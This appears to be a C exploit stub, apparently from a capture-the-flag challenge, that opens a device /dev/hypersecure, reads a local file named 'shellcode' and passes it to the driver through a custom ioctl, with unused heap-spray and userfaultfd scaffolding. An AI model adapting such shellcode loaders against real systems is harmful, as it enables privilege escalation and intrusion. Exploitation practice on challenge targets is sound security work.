#define _GNU_SOURCE
#include <stdio.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <sched.h>
#include <sys/mman.h>
#include <signal.h>
#include <assert.h>
#include <sys/syscall.h>
#include <sys/ioctl.h>
#include <linux/userfaultfd.h>
#include <sys/wait.h>
#include <poll.h>
#include <unistd.h>
#include <stdlib.h>
#include <string.h>
#include <pthread.h>
#include <sys/timerfd.h>
#include <math.h>
#include <sys/msg.h>
#include <stdint.h>
#include <sys/xattr.h>
#define MSG_SPRAY_SIZE 0x20
#define SPRAY_SIZE 0x200
#define PAGE_SZ 0x1000

int hsfd;

void success(char* suc_msg){
    printf("[+] %s\n", suc_msg);
    return;
}

void error(char* err_msg){
    printf("[:(] %s\n", err_msg);
    return;
}

int hyper_write(void* payload){
    int res = ioctl(hsfd, 0xdeadbeef, payload);
    return res;
}

void* create_vm(char* filename){
    void* write1 = malloc(PAGE_SZ);

    char *shellcode;

    FILE* osfd = fopen(filename, "rb");
    fseek(osfd, 0, SEEK_END);
    long filelen = ftell(osfd);
    rewind(osfd);


    memset(write1, '\x00', PAGE_SZ);


    assert(filelen <= 0x1000);

    fread(write1, filelen, 1, osfd);

    success("bytes written");

    fclose(osfd);
    hyper_write(write1);
    return write1;
}

int main(int argc, char* argv[]){
    
    //if(!fork()){
        hsfd = open("/dev/hypersecure", O_RDWR);

        if(hsfd < 0){
            error("Failed to open device");
            exit(0);
        }

        success("HYPERSECURE OPENED");

        void* write1 = create_vm("shellcode");
        success("DONE");
        free(write1);

        close(hsfd);
}
